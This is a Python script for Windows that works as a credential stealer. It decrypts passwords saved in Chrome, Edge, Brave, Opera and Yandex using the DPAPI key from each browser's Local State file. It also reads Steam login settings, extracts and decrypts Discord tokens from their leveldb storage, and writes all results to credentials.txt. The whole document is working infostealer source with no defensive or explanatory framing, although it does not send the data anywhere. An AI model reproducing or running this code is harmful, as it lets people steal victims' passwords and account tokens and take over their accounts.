import os
import sqlite3
import win32crypt
import json
import base64
import shutil
import re  # Added this import for regular expressions
from Crypto.Cipher import AES

def get_encryption_key(browser_path):
    """Get encryption key from Local State"""
    local_state_path = os.path.join(browser_path, "Local State")
    
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Error getting key: {e}")
        return None

def decrypt_password(ciphertext, key):
    """Decrypt password using AES-GCM"""
    try:
        if not ciphertext or len(ciphertext) < 15:
            return ""
            
        iv = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]  # Remove auth tag
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_password).decode('utf-8')
    except Exception:
        # Try old DPAPI method
        try:
            return str(win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1])
        except:
            return ""

def get_browser_passwords(browser_path):
    """Get passwords from specified browser"""
    secret_key = get_encryption_key(browser_path)
    if not secret_key:
        print("Failed to get encryption key")
        return []

    passwords = []
    login_data_path = os.path.join(browser_path, "Default", "Login Data")
    
    if not os.path.exists(login_data_path):
        return []

    # Copy file to avoid locking
    temp_db = os.path.join(os.getenv("temp"), "temp_login.db")
    shutil.copy2(login_data_path, temp_db)
    
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            url, username, ciphertext = row
            if url and username and ciphertext:
                password = decrypt_password(ciphertext, secret_key)
                if password:
                    passwords.append({
                        'url': url,
                        'username': username,
                        'password': password
                    })
    except Exception as e:
        print(f"Database processing error: {e}")
    finally:
        if 'conn' in locals():
            conn.close()
        if os.path.exists(temp_db):
            os.remove(temp_db)
    
    return passwords

def get_steam_credentials():
    """Extract Steam credentials"""
    steam_path = os.path.join(os.getenv("APPDATA"), "Steam")
    if not os.path.exists(steam_path):
        return []
    
    credentials = []
    try:
        # Steam stores credentials in config files
        config_path = os.path.join(steam_path, "config", "loginusers.vdf")
        if os.path.exists(config_path):
            with open(config_path, "r", encoding="utf-8") as f:
                content = f.read()
                # Simple parsing of Steam config file
                username_match = re.search(r'"AccountName"\s+"([^"]+)"', content)
                remember_password = re.search(r'"RememberPassword"\s+"([^"]+)"', content)
                
                if username_match and remember_password:
                    credentials.append({
                        'platform': 'Steam',
                        'username': username_match.group(1),
                        'password': 'Saved (remembered)' if remember_password.group(1) == "1" else 'Not saved'
                    })
    except Exception as e:
        print(f"Steam credentials error: {e}")
    
    return credentials

def get_discord_tokens():
    """Extract Discord tokens"""
    discord_paths = [
        os.path.join(os.getenv("APPDATA"), "discord"),
        os.path.join(os.getenv("APPDATA"), "discordcanary"),
        os.path.join(os.getenv("APPDATA"), "discordptb"),
    ]
    
    tokens = set()
    encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
    
    for path in discord_paths:
        if not os.path.exists(path):
            continue
            
        local_state_path = os.path.join(path, "Local State")
        if os.path.exists(local_state_path):
            try:
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = json.load(f)
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]  # Remove DPAPI prefix
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                
                leveldb_path = os.path.join(path, "Local Storage", "leveldb")
                if os.path.exists(leveldb_path):
                    for file_name in os.listdir(leveldb_path):
                        if not file_name.endswith(".ldb") and not file_name.endswith(".log"):
                            continue
                            
                        with open(os.path.join(leveldb_path, file_name), "r", encoding="utf-8", errors="ignore") as f:
                            for line in f:
                                for match in re.findall(encrypted_regex, line):
                                    token = decrypt_password(base64.b64decode(match.split('dQw4w9WgXcQ:')[1]), master_key)
                                    if token:
                                        tokens.add(token)
            except Exception as e:
                print(f"Discord token error: {e}")
    
    return list(tokens)

def save_to_file(data, filename="credentials.txt"):
    """Save data to file"""
    with open(filename, "w", encoding="utf-8") as f:
        for item in data:
            if 'platform' in item:  # Steam/Discord format
                f.write(f"Platform: {item['platform']}\n")
                f.write(f"Username: {item['username']}\n" if 'username' in item else "")
                if 'password' in item:
                    f.write(f"Password: {item['password']}\n")
                if 'token' in item:
                    f.write(f"Token: {item['token']}\n")
            else:  # Browser format
                f.write(f"URL: {item['url']}\n")
                f.write(f"Username: {item['username']}\n")
                f.write(f"Password: {item['password']}\n")
            f.write("-" * 50 + "\n")

def main():
    # Browser paths
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        "Yandex": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data")
    }

    all_credentials = []
    
    # Get browser passwords
    for name, path in browsers.items():
        if os.path.isdir(path):
            print(f"Searching passwords in {name}...")
            passwords = get_browser_passwords(path)
            if passwords:
                print(f"Found {len(passwords)} passwords in {name}")
                all_credentials.extend(passwords)
    
    # Get Steam credentials
    print("Searching Steam credentials...")
    steam_creds = get_steam_credentials()
    if steam_creds:
        print("Found Steam credentials")
        all_credentials.extend(steam_creds)
    
    # Get Discord tokens
    print("Searching Discord tokens...")
    discord_tokens = get_discord_tokens()
    if discord_tokens:
        print(f"Found {len(discord_tokens)} Discord tokens")
        for token in discord_tokens:
            all_credentials.append({
                'platform': 'Discord',
                'token': token
            })
    
    if all_credentials:
        save_to_file(all_credentials)
        print(f"All credentials saved to credentials.txt")
    else:
        print("No credentials found")

if __name__ == "__main__":
    main()